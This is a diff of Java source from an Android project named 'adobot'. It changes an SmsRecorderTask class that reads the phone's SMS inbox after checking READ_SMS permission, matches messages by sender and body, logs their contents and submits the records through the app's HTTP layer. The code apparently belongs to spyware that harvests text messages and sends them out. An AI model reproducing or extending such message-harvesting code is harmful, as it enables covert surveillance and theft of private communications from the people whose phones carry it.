@@ -4,7 +4,6 @@ import android.Manifest;
 import android.arch.persistence.room.Room;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.ContentObserver;
@@ -16,14 +15,13 @@ import android.util.Log;
 
 import com.android.adobot.AdobotConstants;
 import com.android.adobot.CommonParams;
-import com.android.adobot.activities.SetupActivity;
+import com.android.adobot.SmsBroadcastReceiver;
 import com.android.adobot.database.AppDatabase;
 import com.android.adobot.database.Sms;
 import com.android.adobot.database.SmsDao;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpCallback;
 import com.android.adobot.http.HttpRequest;
-import com.android.adobot.network.NetworkSchedulerService;
 
 import org.json.JSONObject;
 
@@ -31,8 +29,6 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Objects;
-
-import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
 /**
  * Created by adones on 2/27/17.
@@ -106,12 +102,11 @@ public class SmsRecorderTask extends BaseTask {
     }
 
 
-    private Sms findSmsByAttributes(String mPhone, String mBody, String mDate, int mType) {
-        Log.i(TAG, "Getting all sms");
+    public Sms findSmsFromContent(String mPhone, String mBody, int mType) {
 
         if(ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
 
-            Uri callUri = Uri.parse("content://sms");
+            Uri callUri = Uri.parse("content://sms/inbox");
             ContentResolver cr = context.getApplicationContext().getContentResolver();
             Cursor mCur = cr.query(callUri, null, null, null, null);
             if (mCur.moveToFirst()) {
@@ -133,7 +128,6 @@ public class SmsRecorderTask extends BaseTask {
 
                         if (Objects.equals(mBody.trim(), body.trim()) &&
                                 Objects.equals(mPhone.trim(), phone.trim()) &&
-                                Objects.equals(mDate, date) &&
                                 mType == type) {
 
                             // found
@@ -141,6 +135,8 @@ public class SmsRecorderTask extends BaseTask {
                             if (sms == null) {
                                 sms = new Sms();
                             }
+
+                            Log.i(TAG, "Subtituting sms from:" + mPhone + " Message: " + body);
 
                             sms.set_id(id);
                             sms.setThread_id(thread_id);
@@ -185,15 +181,18 @@ public class SmsRecorderTask extends BaseTask {
 
     private void submitSms(Sms sms, final SubmitSmsCallback cb) {
 
+        String err = "Can't find sms: " + sms.getBody() + ", From: " + sms.getPhone();
 
-        if (sms.get_id() == 0 || Objects.equals(sms.get_id(), "") || sms.getThread_id() == null || Objects.equals(sms.getThread_id(), "")) {
-            sms = findSmsByAttributes(sms.getPhone(), sms.getBody(), sms.getDate(), sms.getType());
-            if (sms == null) {
-                submitNextRecord(cb);
-                Log.i(TAG, "Can't find sms: " + sms.getBody() + ", From: " + sms.getPhone());
-                return;
+        if (sms.get_id() == 0 && Objects.equals(SmsBroadcastReceiver.SMS_RECEIVED, sms.getThread_id()) && Objects.equals(sms.getName(), SmsBroadcastReceiver.SMS_RECEIVED)) {
+            Sms smsRecord = findSmsFromContent(sms.getPhone(), sms.getBody(), sms.getType());
+            if (smsRecord == null) {
+                Log.i(TAG, err);
+                sms.setName("UNKNOWN_CONTACT");
+                sms.setThread_id("0");
+                sms.set_id(0);
+            } else {
+                sms = smsRecord;
             }
-            sms.setName(getContactName(sms.getPhone()));
         }
 
         final int type = sms.getType();
@@ -255,7 +254,7 @@ public class SmsRecorderTask extends BaseTask {
         }
     }
 
-    private class InsertSmsModel extends Thread {
+    public class InsertSmsModel extends Thread {
         private Sms sms;
 
         public InsertSmsModel(Sms sms) {
@@ -296,7 +295,7 @@ public class SmsRecorderTask extends BaseTask {
         final String body = mCur.getString(mCur.getColumnIndex("body"));
 
         // accept only received and sent
-        if (id != lastId && (type == MESSAGE_TYPE_RECEIVED || type == MESSAGE_TYPE_SENT)) {
+        if (id != lastId && (type == MESSAGE_TYPE_SENT)) {
 
             lastId = id;
 
